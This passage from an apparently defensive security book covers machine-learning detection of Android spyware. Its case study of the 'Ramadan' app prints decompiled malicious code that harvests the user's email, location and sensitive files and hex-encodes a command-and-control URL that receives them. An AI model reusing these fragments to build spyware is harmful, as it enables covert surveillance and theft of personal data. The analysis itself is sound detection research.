<td style="vertical-align: top" class="gray"><p class="noindent">0.8803</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.8824</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.1155</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.1199</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="noindent-tab">API + S + D + LM</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">XGBoost</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.9439</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.8845</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.8803</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.8824</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.1155</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.1199</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">API + S + D + FC</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">GBDT</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.9099</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.8476</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.8388</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.8432</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.1524</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.1603</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top" class="tab"><p class="noindent-tab">API + S + D + CG</p></td>&#13;
<td style="vertical-align: top" class="tab"><p class="noindent-tab">XGBoost</p></td>&#13;
<td style="vertical-align: top" class="tab"><p class="noindent-tab">0.9156</p></td>&#13;
<td style="vertical-align: top" class="tab"><p class="noindent-tab">0.8513</p></td>&#13;
<td style="vertical-align: top" class="tab"><p class="noindent-tab">0.8401</p></td>&#13;
<td style="vertical-align: top" class="tab"><p class="noindent-tab">0.8456</p></td>&#13;
<td style="vertical-align: top" class="tab"><p class="noindent-tab">0.1487</p></td>&#13;
<td style="vertical-align: top" class="tab"><p class="noindent-tab">0.1592</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">All features</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">MLP</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.8394</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.8100</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.6378</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.7137</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.1900</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.3008</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="noindent-tab">Best late fusion</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">XGBoost</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.9998</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.9997</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.9997</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab"><strong>0.9997</strong></p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.0003</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.0009</p></td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
<h3 class="h3" id="ch08lev4"><strong>Qibla Compass Ramadan: A Case Study</strong></h3>&#13;
<p class="noindent"><span epub:type="pagebreak" id="page_227"/>We now consider the case of the Qibla Compass Ramadan malware, which we’ll refer to as simply Ramadan. Researchers at the University of Calgary and the University of California, Berkeley, discovered it, along with several other malicious apps targeting practicing Muslims. In the article “Google Reportedly Bans Dozens of Apps Containing Spyware,” published on April 6, 2022, <em>Forbes</em> alleges that the apps included code from a company based in Panama that paid app developers to incorporate malicious functionality that gathers data for seemingly legitimate companies, such as email addresses and files with sensitive content. According to <em>Forbes</em>, the Panamanian company had links to a US defense contractor with an interest in cyber-security, suggesting that a US intelligence or defense operation had used the apps to target millions of Muslims. Google blocked Ramadan and other related apps in April 2022.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_228"/>Regardless of the developers’ motivations, our machine learning algorithms correctly predicted that the app isn’t goodware and that it is spyware. <a href="ch08.xhtml#ch8lis1">Listing 8-1</a> shows the permissions <em>ramadan.com.ramadan</em> (v4, 9cef) requests.</p>&#13;
<pre>&lt;?xml version="1.0" encoding="utf-8"?&gt;&#13;
&lt;manifest  &#13;
    android:versionCode="4" android:versionName="1.1.2" android:compileSdkVersion="28" &#13;
    android:compileSdkVersionCodename="9" package="ramadan.com.ramadan" &#13;
    platformBuildVersionCode="4" platformBuildVersionName="1.1.2"&gt;&#13;
  &lt;uses-sdk android:minSdkVersion="15" android:targetSdkVersion="28"/&gt;&#13;
  &lt;uses-permission android:name="android.permission.INTERNET"/&gt;&#13;
  &lt;uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/&gt;&#13;
  &lt;uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/&gt;&#13;
  &lt;uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/&gt;&#13;
  &lt;uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/&gt;&#13;
  &lt;uses-permission android:name="android.permission.READ_PHONE_STATE"/&gt;&#13;
  &lt;uses-permission android:name="android.permission.READ_CONTACTS"/&gt;&#13;
  &lt;uses-permission android:name="android.permission.GET_ACCOUNTS"/&gt;&#13;
  &lt;uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/&gt;</pre>&#13;
<p class="list" id="ch8lis1"><em>Listing 8-1: All permissions requested by the Ramadan malware</em></p>&#13;
<p class="indent">As you can see, many of the permissions that help distinguish spyware from goodware are requested here, including <code>READ_PHONE_STATE</code> and <code>RECEIVE_BOOT_COMPLETED</code>. We also see that the malware seeks the <code>READ_CONTACTS</code> and <code>GET_ACCOUNTS</code> permissions, which could enable the app to siphon off the victim’s entire contact list and see their accounts.</p>&#13;
<p class="indent">However, code analysis shows that this particular app doesn’t actually take these actions. Instead, <a href="ch08.xhtml#ch8lis2">Listing 8-2</a> shows the Ramadan app accessing accounts created by applications on the targeted phone to identify the user’s email address. The malware does this by iterating over all registered accounts and looking for a name that matches a regular expression pattern.</p>&#13;
<pre>public String b() {&#13;
  String str = "Device EMAIL_ID Not Configured";&#13;
  try {&#13;
    if (a(new String[]{&#13;
      "android.permission.READ_CONTACTS", &#13;
      "android.permission.GET_ACCOUNTS"}))&#13;
    {&#13;
      for (Account account : AccountManager.get(a).getAccounts()) {&#13;
        if (Patterns.EMAIL_ADDRESS.matcher(account.name).matches()) {&#13;
          str = account.name.trim();&#13;
        }&#13;
      }&#13;
    }&#13;
    return str;&#13;
  } catch (Exception e) {&#13;
    aui.a("UtilityHead", "exception :" + e.toString(), a);&#13;
    return str;&#13;
  }&#13;
}</pre>&#13;
<p class="list" id="ch8lis2"><em>Listing 8-2: The Ramadan app determining the phone user’s email address</em></p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_229"/>In addition, the app requests the <code>ACCESS_COARSE_LOCATION</code> and <code>ACCESS_FINE_LOCATION</code> permissions, which are useful for distinguishing spyware from other forms of malware. <a href="ch08.xhtml#ch8lis3">Listing 8-3</a> shows it grabbing location information at the coarse level, including the user’s country and administrative area.</p>&#13;
<pre>public Void doInBackground(Void... voidArr) {&#13;
  try {&#13;
    QiblaActivity.this.s = QiblaActivity.this.m();&#13;
    QiblaActivity.v = QiblaActivity.this.a(&#13;
      QiblaActivity.this.n, QiblaActivity.this.o,&#13;
      QiblaActivity.this.t, QiblaActivity.this.u);&#13;
    this.a = String.valueOf(QiblaActivity.this.s / 1000);&#13;
    List&lt;Address&gt; fromLocation = new Geocoder(&#13;
      QiblaActivity.this, Locale.ENGLISH).getFromLocation(&#13;
        QiblaActivity.this.n, QiblaActivity.this.o, 1);&#13;
    if (fromLocation.size() &lt;= 0) {&#13;
      return null;&#13;
    }&#13;
    QiblaActivity qiblaActivity = QiblaActivity.this;&#13;
    String unused = qiblaActivity.z = "Location: " +&#13;
      fromLocation.get(0).getCountryName() + ", " +&#13;
      fromLocation.get(0).getAdminArea();&#13;
    return null;&#13;
  } catch (Exception unused2) {&#13;
    this.b.dismiss();&#13;
    return null;&#13;
  }&#13;
}</pre>&#13;
<p class="list" id="ch8lis3"><em>Listing 8-3: The Ramadan app accessing coarse-grained location data</em></p>&#13;
<p class="indent">In <a href="ch08.xhtml#ch8lis4">Listing 8-4</a>, the app obtains fine-grained location information by accessing the <code>getLatitude()</code> and <code>getLongitude()</code> functions.</p>&#13;
<pre>public class GpsService extends Service implements LocationListener {&#13;
  public Context a;&#13;
  public boolean b = false;&#13;
  public boolean c = false;&#13;
  public boolean d = false;&#13;
  public Location e = null;&#13;
  public double f;&#13;
  public double g;&#13;
  public LocationManager h;&#13;
&#13;
  public GpsService(Context context) {&#13;
    this.a = context;&#13;
    a();&#13;
  }&#13;
&#13;
  public Location a() {&#13;
    try {&#13;
      this.h = (LocationManager) this.a.getSystemService("location");&#13;
      this.b = this.h.isProviderEnabled("gps");&#13;
      this.c = this.h.isProviderEnabled("network");&#13;
      if (!this.b &amp;&amp; !this.c) {&#13;
        return this.e;&#13;
      }&#13;
      this.d = true;&#13;
      if (this.c) {&#13;
        this.h.requestLocationUpdates("network", 30000, 10.0f, this);&#13;
        if (this.h != null) {&#13;
          this.e = this.h.getLastKnownLocation("network");&#13;
          if (this.e != null) {&#13;
            this.f = this.e.getLatitude();&#13;
            this.g = this.e.getLongitude();&#13;
          }&#13;
        }&#13;
      }&#13;
      if (this.b &amp;&amp; this.e == null) {&#13;
        this.h.requestLocationUpdates("gps", 30000, 10.0f, this);&#13;
        if (this.h != null) {&#13;
          this.e = this.h.getLastKnownLocation("gps");&#13;
          if (this.e != null) {&#13;
            this.f = this.e.getLatitude();&#13;
            this.g = this.e.getLongitude();&#13;
          }&#13;
        }&#13;
      }&#13;
      return this.e;&#13;
    } catch (Exception e2) {&#13;
      e2.printStackTrace();&#13;
    }&#13;
  }&#13;
}</pre>&#13;
<p class="list" id="ch8lis4"><em>Listing 8-4: The Ramadan app accessing fine-grained location data</em></p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_230"/>It’s unclear whether the location information accessed here is part of the spyware functionality or the app’s legitimate activities, as the code sends it to a second URL that isn’t obviously connected to the app’s primary command-and-control server or to the malware developers.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_231"/><a href="ch08.xhtml#ch8lis5">Listing 8-5</a> shows a key piece of functionality used to collect potentially sensitive files. In particular, we see it searching for files with the extensions <em>.txt</em>, <em>.apk</em>, <em>.mp3</em>, <em>.3gp</em>, <em>.opus</em>, <em>.ogg</em>, <em>.doc</em>, <em>.pdf</em> , <em>.jpeg</em>, and <em>.jpg</em>.</p>&#13;
<pre>public static ArrayList&lt;File&gt; a(File file) {&#13;
  ArrayList&lt;File&gt; arrayList = new ArrayList&lt;&gt;();&#13;
  File[] listFiles = file.listFiles();&#13;
  if (listFiles != null &amp;&amp; listFiles.length &gt; 0) {&#13;
    for (File file2 : listFiles) {&#13;
      if (file2.isDirectory()) {&#13;
        arrayList.addAll(a(file2));&#13;
      } &#13;
      else if (&#13;
          file2.getName().endsWith(".txt") ||&#13;
          file2.getName().endsWith(".apk") ||&#13;
          file2.getName().endsWith(".mp3") ||&#13;
          file2.getName().endsWith(".3gp") ||&#13;
          file2.getName().endsWith(".opus") ||&#13;
          file2.getName().endsWith(".ogg") ||&#13;
          file2.getName().endsWith(".doc") ||&#13;
          file2.getName().endsWith(".pdf") ||&#13;
          file2.getName().endsWith(".jpeg") ||&#13;
          file2.getName().endsWith(".jpg")) {&#13;
        arrayList.add(file2);&#13;
      }&#13;
    }&#13;
  }&#13;
  return arrayList;&#13;
}</pre>&#13;
<p class="list" id="ch8lis5"><em>Listing 8-5: The Ramadan app accessing sensitive files</em></p>&#13;
<p class="indent">After collecting the files, the malware uploads them to its command-and-control server. In the code, the address of this server is stored in a simple hex-encoded format, as shown in <a href="ch08.xhtml#ch8lis6">Listing 8-6</a>. Decoding the string reveals the URL <em>https://www.salat-prayertimes.com/salat/pray/</em>.</p>&#13;
<pre>/* renamed from: a */&#13;
public String doInBackground(Void... voidArr) {&#13;
  try {&#13;
    StringBuilder sb = new StringBuilder();&#13;
    auj auj = this.d;&#13;
    sb.append(auj.c("68747470733a2f2f7777772e73616c61742d707261796572&#13;
74696d65732e636f6d2f73616c61742f707261792f"));&#13;
    auj auj2 = this.d;&#13;
    sb.append(auj.c("73746174732e706870"));&#13;
    sb.append("?");&#13;
    String sb2 = sb.toString();&#13;
    StringBuilder sb3 = new StringBuilder();&#13;
    sb3.append("tc=");&#13;
    auj auj3 = this.d;&#13;
    sb3.append(auj.a(this.b));&#13;
    sb3.append("&amp;tf=");&#13;
    auj auj4 = this.d;&#13;
    sb3.append(auj.a(this.c));&#13;
    String sb4 = sb3.toString();&#13;
    if (aub.a() != null) {&#13;
      return aug.a(this.a, sb2, sb4);&#13;
    }&#13;
    return null;&#13;
  } catch (Exception e2) {&#13;
    aui.a("TermSet", "exception :" + e2.toString(), this.a);&#13;
    return null;&#13;
  }&#13;
}&#13;
&#13;
/* access modifiers changed from: protected */&#13;
/* renamed from: a */&#13;
public void onPostExecute(String str) {&#13;
  if (this.e.a(str)) {&#13;
    try {&#13;
      auj auj = this.d;&#13;
      this.e.b(auj.b(str));&#13;
    } catch (Exception e2) {&#13;
      aui.a("TermSet", "exception :" + e2.toString(), this.a);&#13;
    }&#13;
  }&#13;
}</pre>&#13;
<p class="list" id="ch8lis6"><em>Listing 8-6: The Ramadan app reaching out to a command-and-control server</em></p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_232"/>Interestingly, Ramadan doesn’t request SMS-related permissions. This may be because it’s primarily interested in collecting sensitive files and personal information to determine the device’s owner. This behavior supports the hypothesis that the malware was distributed to collect intelligence, as the usual features for generating revenue are conspicuously absent.</p>&#13;
<h3 class="h3" id="ch08lev5"><strong>Predictions for Spyware Apps</strong></h3>&#13;
<p class="noindent"><a href="ch08.xhtml#ch8tab3">Table 8-3</a> shows how well our machine learning classifiers performed when presented with 10 spyware apps, including Ramadan, that are more recent than those on which the classifiers were trained. A <em>Yes</em> value indicates that the classifier correctly predicted the sample to be spyware.</p>&#13;
<p class="tabcap" id="ch8tab3"><span epub:type="pagebreak" id="page_233"/><strong>Table 8-3:</strong> Performance of Machine Learning Classifiers on Recent Spyware Samples</p>&#13;
<table class="all">&#13;
<colgroup>&#13;
<col style="width:40%"/>&#13;
<col style="width:30%"/>&#13;
<col style="width:30%"/>&#13;
</colgroup>&#13;
<thead>&#13;
<tr>&#13;
<th class="table-h" style="vertical-align: top"><p class="noindent-tab"><strong>Sample name</strong></p></th>&#13;
<th class="table-h" style="vertical-align: top"><p class="noindent-tab"><strong>Distinguished from goodware</strong></p></th>&#13;
<th class="table-h" style="vertical-align: top"><p class="noindent-tab"><strong>Distinguished from other malware</strong></p></th>&#13;
</tr>&#13;
</thead>&#13;
<tbody>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">Bahamut</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">Yes</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">Yes</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="noindent-tab">Advanced Speed Booster</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">No</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">No</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">Ahorcado</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">Yes</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">Yes</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="noindent-tab">Test003</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">Yes</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">Yes</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">SeitaFool</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">No</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">No</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="noindent-tab">Zanmer</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">Yes</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">Yes</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">DDLight</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">Yes</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">Yes</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="noindent-tab">Dougaleaker</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">Yes</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">No</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">Cricketland</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">Yes</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">No</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="noindent-tab">Ssucl</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">Yes</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">Yes</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">Ramadan</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">Yes</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">Yes</p></td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
<p class="indent">Note that some of the names we’ve assigned to these spyware samples may not be widely known to the security community.</p>&#13;
<p class="indent">The machine learning algorithms were able to correctly identify eight of the samples, producing an 80 percent recall rate and a 100 percent precision rate on these predictions. We cannot be sure why the two other spyware samples (which we’ve called Advanced Speed Booster and SeitaFool) weren’t correctly classified. One possible reason is that these APKs steal only very few pieces of sensitive information: the browser history and contacts, respectively. These actions do not require the use of permissions such as <code>SEND_SMS</code>, <code>READ_PHONE_STATE</code>, <code>RECEIVE_SMS</code>, <code>READ_SMS</code>, and <code>WRITE_SMS</code>, which are important features used by machine learning algorithms to distinguish spyware from goodware.</p>&#13;
<h3 class="h3" id="ch08lev6"><strong>Up Next</strong></h3>&#13;
<p class="noindent">This chapter showed that machine learning can effectively separate spyware from goodware and other forms of malware. In the former case, permissions once again play a huge role; particularly SMS-related ones and permissions such as <code>READ_PHONE_STATE</code>, <code>GET_TASKS</code>, <code>SYSTEM_ALERT_WINDOW</code>, and <code>MOUNT_UNMOUNT_FILESYSTEMS</code>. To separate spyware from other forms of malware, the classifiers relied on different features, including the <code>READ_EXTERNAL_STORAGE</code>, <code>WRITE_EXTERNAL_STORAGE</code>, and <code>ACCESS_FINE_LOCATION</code> permissions.</p>&#13;
<p class="indent">Our discussion of the Ramadan app points to yet another element of which Android users should be wary. Criminals aren’t the only ones interested in compromising your phone; a government, too, might covertly harvest your data. You can find additional information about Android spyware in “A Data-Driven Characterization of Modern Android Spyware” by Fabio Pierazzi et al.<span epub:type="pagebreak" id="page_234"/></p>&#13;
</div>
</div>
<div style="float: none; margin: 10px 0px 10px 0px; text-align: center;"><p><a href="https://oceanofpdf.com"><i>OceanofPDF.com</i></a></p></div></body></html>